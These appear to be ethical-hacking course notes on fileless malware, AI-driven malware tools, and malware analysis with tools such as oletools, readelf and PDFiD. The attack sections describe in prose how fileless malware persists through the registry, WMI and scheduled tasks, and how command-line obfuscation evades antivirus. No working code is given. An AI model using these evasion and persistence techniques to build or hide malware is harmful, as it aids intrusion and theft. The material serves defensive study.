		- Launching Fileless Malware through In-Memory Exploits:
			- Attackers can inject malicious payloads into running memory (RAM) to target legitimate processes without leaving traces. This type of intrusion is difficult to detect by antivirus software, as the payload is executed directly from memory rather than stored on local disks. Attackers exploit APIs and Windows admin tools like WMI, PSExec, and PowerShell to access process memory, often using reflective Dynamic Link Library (DLL) methods to load malicious scripts into host processes while avoiding writing DLLs to disk.\
			- EternalBlue is an in-memory exploit that targets vulnerabilities in the Windows SMB 1 protocol, enabling attackers to access services and applications. The attacker then targets the lsass.exe file, which handles user authentication and other critical operations. By injecting malicious code into lsass.exe, attackers can launch further attacks while evading detection, often using tools like Mimikatz to extract credentials from memory.
		- Launching Fileless Malware through Script-based Injection:
			- Fileless attacks use scripts that embed, obfuscate, and compile binaries and shellcode to avoid creating files on disk. These scripts enable attackers to infect applications or operating systems without being traced, and can identify design flaws or vulnerabilities. Scripts are flexible and can be executed from any file or directly from memory.
			- Attackers exploit this flexibility and system vulnerabilities to inject malicious scripts into memory via PowerShell, evading detection. Once in control, they can run scripts remotely through a command-line interface to spread infections and initiate other malicious activities. Threats like KOVET, POWMET, and FAREIT have used malicious scripts for such attacks.
		- Launching Fileless Malware by Exploiting System Admin Tools:
			- The attacker exploits default system admin tools, features, and utilities to spread fileless infections. They use tools like Certutil and Windows Management Instrumentation Command (WMIC) to steal information, as well as command-line utilities such as Regsvr32 and Rundll32 to execute malicious DLLs. These exploited command lines allow the attacker to install modified penetration testing tools, gaining full access to the target system. These tools are used to access payloads, maintain persistence, steal and export data, and expand malware. Since these tools appear legitimate, they can evade detection by traditional antivirus software.
			- Attackers can exploit system tools such as remote desktop utilities, command-line tools like Regsvr32, PowerShell, Rundll32, CertUtil, and WMIC, along with penetration testing tools like Mimikatz and Cobalt Strike. This technique enables attackers to steal critical information, such as credentials, and use it to launch further attacks.
		- Launching Fileless Malware through Phishing:
			- Attackers often use social engineering techniques, such as phishing, to spread fileless malware to target systems. They send spam emails with malicious links, and when the victim clicks on the link, they are directed to a fraudulent website that automatically loads Flash and triggers the exploit. Additionally, the fileless malware scans the target system for vulnerabilities in system tools like PowerShell, WMI, and browser Java plug-ins. Once a vulnerability is identified, the malware exploits it to download and execute a malicious payload, compromising sensitive information stored in the process memory. Fileless threats can also maintain persistence by creating AutoStart registry entries, depending on the attacker’s goals.
		- Launching Fileless Malware through Windows Registry:
			- Modifying the ExecutionPolicy settings in the registry to "unrestricted" or "bypass" can enable the execution of malicious scripts. Attackers can exploit these vulnerabilities to deploy fileless malware on targeted systems. For instance, they may use malware like Kovter to execute malicious scripts through registry modifications, allowing them to bypass standard security measures, including antivirus software. The malware also exploits the mshta.exe Windows binary through registry changes to run the malicious script.
			- The malware creates multiple registry entries containing encoded JavaScript, which is executed by another registry entry that incorporates mshta and the JavaScript ActiveXObject. This method uses wscript.shell to run the encoded script, making it a sophisticated technique for launching fileless attacks.
	- Maintaining Persistence with Fileless Techniques:
		- Once malware infiltrates a system, server, or network, it can remain undetected for extended periods. Unlike traditional malware, fileless malware does not rely on disk files to spread or maintain its presence. Instead, attackers use unique methods to ensure persistence:
		- Registry Persistence: Attackers store the malicious payload in the system registry, which holds configuration data, application files, and settings. Once the malicious code is loaded into specific registry keys, it executes automatically during system restarts or when certain shortcuts are clicked.
		- Task Scheduler Exploitation: Attackers can exploit the Windows Task Scheduler to activate malicious scripts at specific times. These scheduled tasks run malware from the registry at regular intervals, helping it spread infections within the system.
		- WMI Exploitation: Attackers can also leverage Windows Management Instrumentation (WMI), which is designed to manage systems and devices on a network. By storing malicious scripts in the WMI repository, attackers can later execute them using WMI utilities, maintaining persistence without relying on traditional file storage.
	- Fileless Malware:
		- LODEINFO:
			- LODEINFO is a fileless malware that enables attackers to remotely control infected hosts without detection by security solutions. The infection begins with phishing emails containing malicious Microsoft Word documents. When opened, the document triggers VBA macros that launch downloader shellcode, which executes the LODEINFO implant.
			- LODEINFO uses remote template injection to fetch and execute malicious macros hosted on the attacker’s server each time the victim opens the Word document with the template. The shellcode downloader retrieves a file disguised as a privacy-enhanced mail (PEM) from a C2 server, which loads the backdoor directly into memory. The downloader shares similarities with the known fileless downloader DOWNIISSA, using a self-patching mechanism, encoded C2 server data, and a structure to decrypt the fake PEM file. This method allows the malware to evade security controls and maintain persistent access for malicious operations.
		- Additional Fileless Malware: Fileless Revenge RAT, Divergent, DarkWatchman, HeadCrab 2.0, BazarBackdoor, Astaroth, Nodersok, Vaporworm, Sodinokibi Ransomware, Kovter and Poweliks, Dridex, Sorebrect Ransomware
	- Fileless Malware Obfuscation Techniques to Bypass Antivirus:
		- Inserting Characters : Attackers insert special characters, such as commas (,) and semicolons (;), between malicious commands and strings to make well-known commands harder to detect. These characters are treated as whitespace in command-line arguments, allowing the commands to be processed without issue. This technique helps attackers break up malicious strings, evading detection by signature-based security solutions.
		- Inserting Parentheses : In general, parentheses are used to improve code readability, group complex expressions, and split commands. When parentheses are used, the variables within a code block are treated and evaluated as part of a single-line command. Attackers exploit this feature to split and obfuscate malicious commands, making them harder to detect.
		- Inserting Caret Symbol : The caret symbol (^) is typically used in shell commands for escaping characters. Attackers exploit this feature by inserting single or double caret symbols within a malicious command to escape parts of the command during execution, helping to evade detection.
		- Inserting Double Quotes : When a command is enclosed in double quotes, it does not affect the normal execution of the command. Additionally, the command-line parser treats the double quote symbol as an argument delimiter. Attackers exploit this by using double quotes to concatenate malicious commands within arguments.
		- Using Custom Environment Variables : Another method attackers use to obfuscate fileless malware is by exploiting environment variables. In Windows, environment variables are dynamic objects that store modifiable values used by applications at runtime. Attackers leverage environment variables to split malicious commands into multiple strings and set their values at runtime to execute the malicious commands.
		- Using Pre-assigned Environment Variables : Another technique used by attackers involves retrieving specific characters from pre-assigned environment variables, such as "%CommonProgramFiles%." Attackers refer to the characters in these variables by their index and exploit them to execute malicious commands.
- AI-based Malware
	- AI-based malware leverages artificial intelligence (AI) techniques and algorithms to enhance its functionality and achieve its objectives. Using sophisticated algorithms, AI malware autonomously infiltrates target systems, evades detection mechanisms, and executes malicious payloads with unmatched speed and precision.
	- Working of AI-based Malware:
		- Infiltration: This is the initial phase where AI malware gains access to the target system. It infiltrates the system through phishing emails, misconfigured devices, or by leveraging existing malware.
		- Establishment: In this phase, the malware secures a foothold on the target system by exploiting vulnerabilities or using advanced evasion techniques.
		- Learning Phase: During this phase, AI malware gathers data about the target system, network, behavior, and security mechanisms to understand the environment and identify potential obstacles.
		- Adaptation: In this phase, the AI malware modifies its source code based on insights from the learning phase to bypass antivirus software and adapts its strategies to achieve its objectives.
		- Execution: In this phase, the malware carries out its intended actions, such as data theft, encryption, or creating backdoors.
		- Propagation: During this phase, AI malware spreads to other systems within the network or across the internet by identifying and exploiting vulnerable systems or using social engineering methods.
		- Evolution: In this phase, the malware evolves into a more sophisticated form by adapting to the changes encountered in the target system during the previous phases.
	- Techniques Used in AI-based Malware Development:
		- Generative Adversarial Networks (GANs):
			- Generative adversarial networks (GANs) have emerged as a powerful tool in AI, particularly for generating new data that resembles, yet remains distinct from, the data on which they were trained.
		- Reinforcement Learning:
			- Reinforcement learning is used to develop or modify AI malware by adding new features. For example, the results generated by the GAN above can be saved as RL_Features/adversarial_imports_set.pk and RL_Features/adversarial_sections_set.pk, which will then be used to incorporate imports and sections into the malware for mutation.
		- Natural Language Processing (NLP):
			- Natural language processing (NLP) is a branch of artificial intelligence focused on enabling interaction between computers and humans through natural language. The primary goal of NLP is to allow computers to understand, interpret, and generate human languages in a meaningful way. While NLP has numerous beneficial applications, such as improving accessibility and automating customer service, it can also be exploited for malicious purposes, including the development of AI-based malware.
			- The following are different ways attackers utilize NLP in the development of malware:
				- Sophisticated Phishing Attacks : Using NLP, cyber attackers can automate the creation of convincing phishing emails that closely mimic legitimate communications.
				- Context-aware Malware : NLP enables malware to analyze and extract sensitive information from documents and conversations on infected devices more effectively.
				- Automated Social Engineering : NLP allows malware to automate social engineering attacks through chatbots or systems that interact directly with victims.
				- Sentiment Analysis for Targeting : Sentiment analysis can help identify potential victims for social engineering attacks by evaluating social media posts.
				- Evasion Techniques : NLP enables malware to evade detection by understanding and responding to security analysis techniques.
				- Command and Control Communications : NLP can enhance the sophistication of command and control (C&C) communications between infected devices and attackers.
				- Deepfake Generation for Scams : NLP and AI can be used to create deepfakes, impersonating authority figures to trick victims into revealing information or downloading malware.
	- AI-based Malware:
		- FakeGPT:
			- The FakeGPT malware campaign involves a malicious Chrome extension that mimics ChatGPT, distributed through phishing and misleading ads to trick users into downloading it from unofficial sources.
			- Once installed, the malware gains unauthorized access to the user's Facebook account, targeting the ad management section. This allows attackers to steal sensitive information, take control of ad accounts, and run fraudulent ads, resulting in financial losses and reputational damage. By leveraging the trust associated with ChatGPT, attackers monetize compromised accounts and divert funds to their campaigns, with the malware's disguise as a legitimate AI tool making detection difficult.
		- BlackMamba:
			- BlackMamba is an AI-generated polymorphic malware designed to infiltrate and exploit target environments. It uses a large language model (LLM) to create a polymorphic keylogger, obfuscate its actions, and establish encrypted channels for data exfiltration and command server communication. The malware evades traditional security measures, such as firewalls and antivirus software, and collects user keystrokes, which are compressed and sent to the attacker's C2 server in small fragments.
			- The attacker can gather sensitive data, including usernames, passwords, and credit card details, which is then analyzed with AI algorithms for further exploitation, such as spear phishing. Additionally, the data may be sold on the dark web, enabling the installation of more malware, data theft, or ransomware attacks on other systems in the network.
		- WormGPT:
			- WormGPT is an AI-based chatbot built on the open-source GPT-J LLM, capable of interpreting and responding to natural language text. It assists attackers in creating convincing, personalized fake emails to deceive users. Attackers can input prompts to generate human-like responses, which are used to lure victims into revealing sensitive information or sending money. The generated emails impersonate trusted business contacts, making them highly convincing.
			- For example, WormGPT's business email compromise (BEC) capabilities are trained on diverse datasets, including confidential malware-related data. The malware crafts emails with exceptional grammatical accuracy, enabling spear phishing attacks on targeted organizations.
		- FraudGPT:
			- FraudGPT is a malicious AI-driven tool similar to ChatGPT but designed to produce deceptive content for malicious purposes. It is trained on a massive dataset of text and code selected for illegal activities, allowing it to learn patterns used in fraud. Attackers can use FraudGPT to generate convincing phishing emails, social engineering tactics, cracking tools, engage in carding, identify vulnerabilities, and more.
			- Attackers can also use FraudGPT to create new adversarial variants tailored for various cybercriminal activities, operating without ethical constraints. This tool is available for purchase on Dark Web marketplaces and through Telegram platforms.
		- AI-Generated Videos: Malware Spread Through YouTube:
			- Attackers use AI-generated video tools like Synthesia and D-ID to create human-like personas and exploit trust. They masquerade as software tutorial creators, offering cracked versions of popular software such as Photoshop, Autodesk 3ds Max, and AutoCAD.
			- In the video description, they include links to "free" versions of the software, which, when clicked, install stealer malware such as Vidar, RedLine, or Raccoon. These malware variants infiltrate the system and extract sensitive data, including usernames and passwords. The stolen data is analyzed using AI on the C2 server for further attacks.
		- Stuxnet
		- DeepLocker
		- Mylobott
- Malware Analysis
	- Malware analysis is the process of reverse engineering a specific piece of malware to determine its origin, functionality, and potential impact.
	- Analyzing malware on production devices connected to production networks is highly dangerous. Therefore, malware samples should always be analyzed in a controlled testing environment with an isolated network to prevent potential harm.
	- Sheep Dip Computer:
		- A Sheep Dip Computer is a dedicated, standalone system used for scanning and analyzing external storage devices, software, or files for malware before they are introduced into a secure network or environment. This system acts as an isolated checkpoint to prevent malicious software from compromising critical systems.
		- A computer used for sheep dipping should be equipped with tools such as port monitors, file monitors, network monitors, and one or more antivirus programs to perform malware analysis on files, applications, incoming messages, and external hardware devices (such as USB drives and other portable storage media).
		- Antivirus Sensor Systems: An antivirus sensor system is a suite of computer software designed to detect and analyze malicious code threats, including viruses, worms, and Trojans. It is commonly used in conjunction with sheep dip computers to enhance malware detection and prevention capabilities.
	- Types of Malware Analysis:
		- Static Malware Analysis:
			- This process is also known as code analysis and involves examining the executable binary code without executing it to gain a deeper understanding of the malware and its purpose. General static analysis entails evaluating the malware without running its code or instructions.
			- The process employs various tools and techniques to identify the malicious components of a program or file. Additionally, it gathers information about the malware's functionality and collects technical indicators or simple signatures generated by the malware.
		- Dynamic Malware Analysis:
			- This process is also known as behavioral analysis and involves executing the malware code to understand how it interacts with the host system and its impact after infection.
			- Dynamic analysis entails running the malware to observe its behavior and operations, identifying technical signatures that confirm its malicious intent. It reveals critical information such as domain names, file path locations, created registry keys, IP addresses, additional files, installation files, DLLs, and associated files present on the system or network.
	- Malware Analysis Procedure:
		- Preparing Testbed:
			- Requirements to Build Testbed:
				- An isolated test network to host testbed, along with isolated network services such as DNS.
				- Target machines with various operating systems and configuration states (e.g., non-patched, patched, etc.).
				- Virtualization snapshots and re-imaging tools to quickly wipe and rebuild target machines.
				- Tools are required for testing:
					- Imaging tool: Used to create a clean image for forensics and prosecution purposes.
					- File/data analysis tools: Used to perform static analysis of potential malware files.
					- Registry/configuration tools: Malware often infects the Windows registry and other configuration settings. These tools help identify the last saved settings.
					- Sandbox: Used for performing dynamic analysis manually.
					- Log analyzers: Devices under attack record malware activities and generate log files. These tools are used to extract and analyze those log files.
					- Network capture tools: Used to monitor and understand how the malware exploits the network.
			- Steps to prepare Testbed:
				- Step 1: Allocate a physical system to serve as the analysis lab.
				- Step 2: Install a virtual machine (e.g., VMware, Hyper-V, etc.) on the system.
				- Step 3: Install a guest operating system (OS) on the virtual machine(s).
				- Step 4: Isolate the system from the network by setting the network interface card (NIC) to "host-only" mode.
				- Step 5: Simulate internet services using tools like INetSim.
				- Step 6: Disable features such as "shared folders" and "guest isolation" to enhance security.
				- Step 7: Install malware analysis tools on the guest OS.
				- Step 8: Generate the hash value for each OS and tool to ensure their integrity.
				- Step 9: Copy the malware sample to the guest OS for analysis.
		- Static Analysis:
			- Static analysis is the process of examining an executable file without running or installing it. This makes static analysis relatively safe, as the investigator does not need to execute or install the suspicious file.
			- However, some malware can perform malicious activities without needing installation. Therefore, investigators should always conduct static analysis in a controlled environment.
			- This method uses various tools and techniques to quickly determine whether a file is malicious. Analyzing the binary code provides insights into the malware’s functionality, network signatures, exploit packaging techniques, dependencies, etc.
			- Static Malware Analysis Techniques:
				- File Fingerprinting:
					- File fingerprinting is the process of computing the hash value of a given binary code and using it to uniquely identify malware or periodically verify whether any changes have been made to the binary code during analysis. Tools like HashMyFiles can be used to calculate various hash values for the malware file.
					- File Fingerprinting Tools:
						- HashMyFiles : HashMyFiles generates hash values (MD5, SHA-1, CRC32, SHA-256, SHA-512, SHA-384) and provides file details such as full path, creation/modification dates, file size, attributes, version, and extension for searching and comparison.
						- Hashing (github.com)
						- SHA-256 hash calculator (xorbin.com)
						- Hash Tool (www.digitalvolcano.co.uk)
						- MD5sums (www.pc-tools.net)
						- tools4noobs - Online hash calculator (www.tools4noobs.com)
				- Local and Online Malware Scanning:
					- Scan the binary code locally using well-known and up-to-date antivirus software. If the code under analysis is a component of a well-known malware, it may already have been discovered and documented by antivirus vendors. Alternatively, the code can be uploaded to online services like VirusTotal for scanning by a wide range of antivirus engines.
					- Local and Online Malware Scanning Tools:
						- VirusTotal : VirusTotal is a free service that analyzes suspicious files and URLs, detecting threats like viruses, worms, and Trojans. It provides a report showing the number of engines marking the file as malicious, the malware name, and additional details such as the target machine, compilation timestamp, file type, compatible processors, entry point, PE sections, DLLs, PE resources, hash values, accessed IP addresses, program code, and established connections.
						- Any.Run (app.any.run) 
						- Hybrid Analysis (www.hybrid-analysis.com) 
						- JOESandbox Cloud (www.joesandbox.com) 
						- Jotti (virusscan.jotti.org) 
						- Valkyrie Sandbox (valkyrie.comodo.com) 
						- Online Scanner (www.fortiguard.com)
				- Performing Strings Search:
					- Software programs often include strings that serve as commands for specific functions, such as printing output or conveying information to users. In some cases, these strings can reveal malicious intent, such as accessing internal memory or cookie data, which may be embedded in the compiled binary code. Analyzing embedded strings in an executable file can expose readable text, including status updates, error messages, or other clues about the program's basic functionality.
					- In malware analysis, searching for malicious strings can help identify the harmful actions a program might perform. For example, if a program accesses a URL, the corresponding URL string will often be stored within it. It is essential to remain vigilant when examining strings and to also search for embedded and encrypted strings to detect suspicious files. Tools like BinText can be used to extract these embedded strings from executable files, aiding in the analysis process.
					- String Searching Tools:
						- BinText Source : BinText is a text extractor that can retrieve text from any file. It can detect plain ASCII text, Unicode text, and resource strings, providing valuable information for each item.
						- FLOSS (github.com)
						- Strings (learn.microsoft.com)
						- Free EXE DLL Resource Extract (resourceextract.com)
						- FileSeek (www.fileseek.ca)
						- Hex Workshop (www.hexworkshop.com)
				- Identifying Packing/Obfuscation Methods:
					- Attackers often use packers to compress, encrypt, or modify a malware executable to avoid detection. Obfuscation techniques also conceal the execution of the program. When the user runs a packed program, it first executes a small wrapper to decompress the packed file and then runs the unpacked file.
					- This process complicates reverse engineering, making it more difficult to uncover the program's logic and metadata through static analysis. Tools like PEiD can help detect common packers, cryptors, and compilers used for PE executable files. Identifying the packer simplifies the task of choosing the appropriate tool for unpacking the code.
					- Packaging/Obfuscation Tools:
						- Detect It Easy (DIE) : DIE is an application used to determine the types of files. In addition to Windows, it is available for Linux and macOS. With its open architecture for signatures, users can easily add custom algorithms for detecting or modifying existing signatures. DIE detects a file's compiler, linker, packer, and more using a signature-based detection method.
						- PEiD : PEiD is a free tool that provides details about Windows executable files. It can identify signatures associated with over 600 different packers and compilers. The tool also displays information about the type of packer used to pack the program, along with additional details such as the entry point, file offset, EP section, and the subsystem used for packing.
						- Macro_ Pack (github.com)
						- UPX (upx.github.io)
						- ASPack (www.aspack.com)
						- VMprotect (vmpsoft.com)
						- ps2-packer (github.com)
				- Finding Portable Executables (PE) Information:
					- The Portable Executable (PE) format is an executable file format used by Windows OS, storing the information required by the system to manage executable code. It contains metadata that helps reveal additional details about the file.
					- Analyzing the metadata of PE files (the Windows binary in PE format) provides information such as creation and modification times, import and export functions, compilation time, DLLs, linked files, strings, menus, and symbols. The PE format includes a header and sections that store metadata about the file and its code mapping within the OS. Tools like PE Explorer can be used to extract this information.
					- The PE file format contains the following sections:
						- .text: Contains the instructions and program code executed by the CPU.
						- .rdata: Stores import and export information, along with other read-only data used by the program.
						- .data: Holds the program's global data, accessible by the system from anywhere.
						- .rsrc: Contains resources used by the executable, such as icons, images, menus, and strings, and provides support for multiple languages.
					- PE Extraction Tools:
						- PE Explorer : PE Explorer allow to open, view, and edit various 32-bit Windows executable file types (also called PE files), including common types like EXE, DLL, and ActiveX Controls, as well as less familiar types such as SCR (Screensavers), CPL (Control Panel Applets), SYS, MSSTYLES, BPL, DPL, etc.
						- Portable Executable Scanner (pescan) (tzworks.net)
						- Resource Hacker (www.angusj.com)
				- Identifying File Dependencies:
					- Software programs rely on various inbuilt libraries of the operating system to perform specific actions. To function correctly, programs often need to interact with internal system files. File dependencies provide information about the system files required by the program, including the process of registration and their locations on the machine. Identifying these dependencies is crucial, as they contain information about the runtime requirements of an application and may offer insights into potential malware within the file.
					- File dependencies include linked libraries, functions, and function calls. By checking the dynamically linked list in a malware executable, it is possible to determine the libraries and functions the program uses, which can help estimate its behavior. Understanding the various DLLs used to load and run the program is essential. Tools like DependencyWalker can help identify the dependencies within an executable file.
					- List of Standard dlls:
						- Kernel32.dll : Core functionality, such as access and manipulation of memory, files, and hardware
						- Advapi32.dll : Provides access to advanced core Windows components such as the Service Manager and Registry
						- User32.dll : User-interface components, such as buttons, scrollbars, and components for controlling and responding to user actions
						- Gdi32.dll : Functions for displaying and manipulating graphics
						- Ntdll.dll : Interface to the Windows kernel
						- WSock32.dll / Ws2_32.dll : Networking DLLs that help to connect to a network or perform network-related tasks
						- Wininet.dll : Supports higher-level networking functions
					- Dependency Extraction Tools:
						- Dependency Walker : Dependency Walker lists all the dependent modules of an executable file and builds hierarchical tree diagrams. It also records all the functions exported by each module and tracks their calls. Additionally, it detects common application issues such as missing or invalid modules, import/export mismatches, circular dependency errors, mismatched machine modules, and module initialization failures.
						- Dependency-check (jeremylong.github.io)
						- Dependency Finder (depfind.sourceforge.io)
						- PE Explorer Dependency Scanner (www.pe-explorer.com)
						- RetireJS (retirejs.github.io)
				- Malware Disassembly:
					- Static analysis also involves dismantling an executable into its binary format to study its functionalities and features. Disassembling the binary code allows for the analysis of the assembly code instructions. This process helps identify the programming language used for the malware, as well as the APIs that reveal its functionality.
					- Tools like IDA can reverse machine code into assembly language. Once the assembly code is reconstructed, the program's logic can be inspected to assess its threat potential. This analysis is often performed using debugging tools such as OllyDbg.
					- Disassembling and Debugging Tools:
						- IDA Pro : IDA Pro is a multi-platform disassembler and debugger used to explore binary programs when the source code is not available, creating maps of their execution. It displays instructions in the same way a processor executes them, using a symbolic representation called assembly language. This makes it easier to identify harmful or malicious processes.
						- Ghidra (ghidra-sre.org)
						- x64dbg (x64dbg.com)
						- Radare2 (rada.re)
						- OllyDbg (www.ollydbg.de)
						- WinDbg (www.windbg.org)
				- Analyzing ELF Executable Files:
					- ELF (Executable and Linkable Format) is a generic executable file format used in Linux. It consists of three main components: an ELF header, sections, and segments, each playing an independent role in the loading and execution of ELF executables. Static analysis of an ELF file involves examining the file without running or installing it. This process includes accessing the binary code and extracting valuable artifacts from the program. The results of the analysis help determine whether the file is malicious.
					- If the ELF file is identified as malicious, the information extracted during static analysis may be insufficient to fully understand the behavior and purpose of the malware, necessitating further dynamic analysis in a secure or isolated environment.
					- Static Analysis of ELF Files Using readelf:
						- The readelf tool displays information about one or more ELF object files. Options control what information is displayed. The tool supports both 32-bit and 64-bit ELF files. Security professionals can use readelf to extract static artifacts from an ELF executable.
						- Identifying Symbols in ELF Executables:
							- Extracting symbols is the process of retrieving data types such as functions and variables used in the source code. These symbols provide insight into the functions and variables implemented by the developers, helping to understand the code's functionality.
							- Extract Symbols from ELF Executable: readelf -s <malware_sample>
						- Identifying Program Headers in ELF Executables:
							- The program headers in an ELF executable reveal the memory layout of the binary code. They help determine whether the ELF executable file is properly packed. To view this information, the readelf tool can be used with the -l option, followed by the ELF executable file name.
							- Retrieve ELF Program Headers: readelf -l <malware_sample>
						- Identifying ELF File Headers:
							- The ELF executable file header contains general information, such as the binary's entry point, program headers, and table locations. This data helps determine the file's architecture and the machine for which it is designed to run.
							- Retrieve Information Contained in ELF File Header: readelf --file-header <malware_sample>
						- Extracting Strings from ELF Executable Files:
							- String extraction involves collecting vital information from a suspected ELF executable file. Strings such as symbols, section names, and function names reveal the purpose of the binary code. Linux includes a default command called strings, which extracts these strings and saves them in a .txt file.
							- Extract Strings from ELF Executable File: strings malware_sample > str.txt
						- Analyzing String Reuse Using Intezer:
							- Intezer is a malware analysis platform that scans files, URLs, endpoints, and memory dumps. It extracts strings from uploaded malware samples and identifies whether those strings are used in other files. By analyzing unknown malware that is difficult to trace, it reduces the effort required by malware analysts.
				- Analyzing Mach-O Executable Files:
					- The Mach Object (Mach-O) file format is an executable file format analogous to the Portable Executable (PE) format for Windows and the Executable and Linkable Format (ELF) for Linux. It is primarily associated with binaries used in macOS and iOS. This file format is employed to distribute executable code and defines how memory interacts with the data and code contained within a binary file.
					- Mach-O malware can directly impact a program’s performance, as memory usage and paging activities are influenced by the arrangement of code within the binary. This type of malware enables attackers to create overlapping memory arrays and assign specific memory locations for executing a Mach-O executable. By exploiting these mechanisms, attackers can achieve privilege escalation and exploit subsequent vulnerabilities, potentially gaining root access.
					- Malicious Mach-O Binaries:
						- Mach-O is a binary format consisting of byte streams organized into meaningful data chunks, such as CPU type, data size, and byte order. It is structured into segments like __PAGEZERO, __TEXT, __DATA, and __OBJC, each containing specific types of code or data. Attackers may exploit these segments to conceal and execute malicious code for privilege escalation.
						- To mitigate such threats, security analysts should analyze Mach-O malware and implement protective measures. Tools like pagestuff, LIEF, and otool can aid in detecting and preventing privilege escalation in macOS systems.
					- Reverse Engineering Mach-O Binaries:
						- Mach-O binaries consist of various segments and their corresponding sections, making it essential for security analysts to evaluate the internal structure of a binary to identify malicious code. Additionally, reverse engineering can be employed to examine all methods and executable files within these segments, helping to mitigate potential threats. Tools like Hopper Disassembler are useful for analyzing Mach-O binary files.
					- Tools:
						- LIEF (lief-project.github.io):
							- LIEF, short for Library to Instrument Executable Formats, is a cross-platform tool developed by QuarksLab for parsing and manipulating various executable formats, including Mach-O binaries. It supports multiple programming languages, such as C, C++, and Python, and provides an abstraction layer for common features across different executable formats.
							- Obtain Information on Mach-O Executable:
								- import lief
								  binary = lief.parse("/usr/bin/ls")
								  print(binary)
						- otool:
							- Security analysts can use otool to analyze and examine binaries, providing detailed information about iOS applications.
							- Check Binary Links with Shared Library: otool -L UnPackNw > ~/Malware/libs.txt
							- Dump Method Names from Obj Section of Mach-O Binary: otool -oV UnPackNw > ~/Malware/methods.txt
							- Acquire Disassembly to Find Obfuscated File Name: otool -tV UnPackNw > ~/Malware/disassembly.txt
						- Hopper Disassembler:
							- Hopper Disassembler is a reverse engineering tool that enables security analysts to disassemble, decompile, and debug application binaries. It analyzes function prologues to extract procedural information, including basic blocks and local variables. By integrating with LLDB or GDB debuggers, Hopper facilitates reverse engineering and dynamic analysis of Mach-O binaries. The tool presents code in various representations for enhanced analysis.
						- pagestuff
				- Analyzing Malicious MS Office Documents:
					- The use of MS Office documents, such as Word documents and PowerPoint presentations, is widespread across organizations. Attackers often exploit these documents to distribute and install malware. When analyzing malware, it is crucial to understand the structure of various MS Office documents and effectively analyze any malicious files.
					- Oletools is a Python-based suite designed to analyze Microsoft OLE2 files, commonly found in MS Office documents. It enables cybersecurity professionals to extract, parse, and detect malicious content within these files. By analyzing macros, embedded objects, and metadata, Oletools identifies potentially harmful elements, such as hidden scripts or exploit code. This makes it a vital tool for uncovering and mitigating threats from malicious Office documents, frequently used in phishing attacks and malware distribution.
					- Finding Suspicious Components:
						- Use the Python-based tool oleid to analyze malicious Office documents and review components that may be classified as suspicious or malicious. The oleid tool is specifically designed for examining OLE files.
						- Shows that malicious Word document named Infected.docx contains VBA macros: python3 oleid.py ‘<path_to_suspect_document>’
					- Finding Macro Streams:
						- The next step is to parse the malicious Office document using oledump to identify streams containing macros.
						- Identify Streams Containing Macros: python3 oledump.py ‘<path_to_suspect_document>’
					- Dumping Macro Streams:
						- Extract the contents of a specific macro stream using oledump:
						- python3 oledump.py -s <stream number> <path_to_suspect_document>
					- Identifying Suspicious VBA Keywords:
						- The olevba tool can be used to view the source code of all VBA macros embedded in a document and identify suspicious VBA keywords and obfuscation techniques commonly used by malware.
						- Review the source code of all VBA macros to determine if the document contains auto-executable macros, obfuscated strings, or indicators of compromise (IOCs), such as filenames, IP addresses, or URLs. Use the following command:
						- python3 olevba.py ‘<path_to_suspect_document>
				- Analyzing Suspicious PDF Documents:
					- PDF documents are commonly used for both personal and business purposes, making them a frequent target for attackers to hide malicious scripts that execute when the document is opened. When analyzing a suspicious PDF file, it is important to perform scans using various tools to determine if it contains malicious scripts. Extract these scripts to assess their potential impact on the system and network.
					- To identify potentially malicious elements in PDF files, tools like PDFiD can scan for specific keywords and object types commonly associated with exploits. Additionally, tools such as PDFStreamDumper allow for deeper analysis, including the inspection and extraction of streams and objects within a PDF.
					- Testing the File with PDFiD to Analyze PDF Keywords:
						- The tool will display the structure of the file, including its contents, such as the header, objects, and any scripts present.
						- Test the suspect PDF file with the PDFiD tool to identify any malicious components:
						- python3 pdfid.py '<path_to_suspect_PDF_file>'
					- Finding Suspicious Objects with PDFStreamDumper:
						- Tools like PDFStreamDumper can be used to explore the internal elements of a suspect PDF file, including objects, streams, and embedded obfuscated scripts. After opening the file in PDFStreamDumper, review the objects one by one along with their stream details to identify any malicious components.
						- The analysis of the fifth object in the infected.pdf file using PDFStreamDumper reveals that it contains a JavaScript header, with its data stream starting in the sixth object. Scanning the sixth object for readable strings, as shown in the screenshot below, indicates the use of the util.printf() function, which can display gathered system data.
					- Scanning the File for Exploits:
						- Scan the suspect PDF file for any potential exploits using the PDFStreamDumper tool. To do this, click the Exploits_Scan button in the toolbar. The tool will then compare the file against a set of known PDF exploit signatures and generate the results in a Notepad file.
				- Analyzing Suspicious Documents Using YARA:
					- YARA (Yet Another Recursive Acronym) is a powerful tool used to identify and classify malware samples. It allows users to create rules that describe patterns of interest in files, such as specific strings, binary sequences, or combinations of characteristics commonly found in malware. These rules are then used to scan files and detect matches, indicating the presence of malicious content.
					- Key features of YARA include its ability to perform both string and binary pattern matching, support for complex conditions and Boolean expressions, and the capability to scan files, directories, and even memory. The tool is highly flexible and can be integrated into various security workflows and automation scripts, making it an essential asset for malware analysis and other cybersecurity operations.
					- Structure of YARA Rules:
						- A YARA rule is structured with specific sections, including the rule header, metadata, strings, and conditions.
						- Rule Header: This section includes the rule's name and optional tags.
						- Metadata: This section is optional and can include key-value pairs that provide additional information about the rule.
						- Strings: This section defines the strings to search for in the files. Strings can be text, hexadecimal, or regular expressions.
						- Condition: This section defines the logic that must be met for the rule to match. It typically involves checking whether one or more of the defined strings are present in the file.
		- Dynamic Analysis:
			- In dynamic analysis, malware is executed in a controlled environment to understand its behavior after infection. This type of analysis requires a safe environment, such as virtual machines and sandboxes, to prevent the malware from spreading. The environment should be designed with tools that can capture every action of the malware in detail and provide relevant feedback. Virtual systems are typically used as the foundation for conducting these experiments.
			- Dynamic analysis is performed to gather valuable information about the malware's activity, such as files and folders created, ports and URLs accessed, functions and libraries called, applications and tools used, information transferred, settings modified, and processes and services started.
			- The environment for dynamic analysis should be set up in a way that prevents malware from propagating to the production network and ensures that the testing system can be restored to a previous state if anything goes wrong during the test.
			- Dynamic Analysis Consists of Two Stages:
				- System Baselining:
					- Baselining refers to the process of capturing the system's state (taking a snapshot) at the beginning of the malware analysis, which can later be compared with the system's state after executing the malware. The main purpose of system baselining is to identify significant changes from the baseline state, helping to understand the impact the malware has had on the system.
					- System baselining involves recording details such as the file system, registry, open ports, network activity, and other relevant system information.
				- Host Integrity Monitoring:
